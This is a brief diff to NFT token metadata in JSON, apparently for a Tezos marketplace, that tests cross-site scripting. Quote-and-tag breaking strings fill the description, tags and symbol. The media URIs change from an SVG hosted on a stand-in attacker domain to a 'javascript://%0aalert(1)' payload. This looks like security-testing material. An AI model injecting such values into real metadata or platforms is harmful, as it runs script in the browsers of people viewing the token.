@@ -3,9 +3,9 @@
     "description": "zzz'\"<p>",
     "tags": ["zzz'\"<p>", "nfts", "illustrations", "art", "design", "gif", "hicetnunc", "hen", "xtz", "tezos", "#tezos", "#CleanNFTs", "#1of1", "#1of1xtz", "objkt"],
     "symbol": "zzz'\"<p>",
-    "artifactUri": "https://attacker-site.untrusted.com/testshld/test1.svg",
-    "displayUri": "https://attacker-site.untrusted.com/testshld/test1.svg",
-    "thumbnailUri": "https://attacker-site.untrusted.com/testshld/test1.svg",
+    "artifactUri": "javascript://%0aalert(1)",
+    "displayUri": "javascript://%0aalert(1)",
+    "thumbnailUri": "javascript://%0aalert(1)",
     "creators": ["tz1U5xKWbH99a2RYuGed29s7iomzfdBfqcgW"],
     "formats": [{
             "mimeType": "image/gif",
@@ -15,7 +15,7 @@
                 "value": "1000x1000",
                 "unit": "px"
             },
-            "uri": "https://attacker-site.untrusted.com/testshld/test1.svg"
+            "uri": "javascript://%0aalert(1)"
         }
     ],
     "decimals": 0,
